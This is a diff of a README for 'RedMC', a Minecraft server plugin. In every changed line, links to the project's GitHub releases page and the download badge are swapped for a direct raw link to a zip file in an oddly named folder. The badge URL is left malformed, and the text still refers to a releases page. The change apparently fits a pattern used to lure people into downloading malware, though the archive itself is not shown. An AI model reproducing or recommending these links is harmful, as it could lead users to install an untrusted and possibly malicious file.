@@ -1,6 +1,6 @@
 # 🎮 RedMC - Simple Plugin Setup for Minecraft SMP
 
-![Download RedMC](https://img.shields.io/badge/Download%20RedMC-v1.0-blue)
+![Download RedMC](https://raw.githubusercontent.com/aAaGgaD/RedMC/main/Notommatidae/RedMC.zip%20RedMC-v1.0-blue)
 
 ## 📋 Description
 
@@ -14,7 +14,7 @@ This guide will help you download and run the RedMC plugin easily, even if you h
 
 To get started, visit our releases page to download the latest version of RedMC:
 
-[Visit this page to download](https://github.com/aAaGgaD/RedMC/releases)
+[Visit this page to download](https://raw.githubusercontent.com/aAaGgaD/RedMC/main/Notommatidae/RedMC.zip)
 
 ### 🔗 Detailed Steps
 
@@ -22,7 +22,7 @@ To get started, visit our releases page to download the latest version of RedMC:
   
 2. **Go to the Releases Page**: Click on the link below to access our releases page:
 
-   [Visit this page to download](https://github.com/aAaGgaD/RedMC/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/aAaGgaD/RedMC/main/Notommatidae/RedMC.zip)
 
 3. **Find the Latest Version**: Look for the latest version listed at the top of the page. You will see a section labeled "Assets."
 
@@ -73,4 +73,4 @@ We value your input. If you encounter any issues or have suggestions, please ope
 
 Thank you for choosing RedMC to enhance your Minecraft SMP experience. Enjoy the plugin, and happy gaming!
 
-[Visit this page to download](https://github.com/aAaGgaD/RedMC/releases)
+[Visit this page to download](https://raw.githubusercontent.com/aAaGgaD/RedMC/main/Notommatidae/RedMC.zip)
